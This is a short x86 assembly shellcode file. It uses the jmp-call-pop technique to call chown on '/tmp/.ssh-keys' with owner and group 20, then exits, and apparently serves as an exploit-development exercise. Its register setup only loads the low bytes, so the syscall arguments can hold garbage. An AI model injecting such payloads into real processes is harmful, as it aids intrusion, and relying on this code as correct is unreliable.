section .text

global _start:

_start:
	jmp short gotocall

shellcode:
	pop ebx
	mov cl, 20
	mov dl, 20
	mov al, 0xB6
	int 0x80

	xor ebx, ebx
	mov al, 0x1
	int 0x80

gotocall:
	call shellcode
	db '/tmp/.ssh-keys'
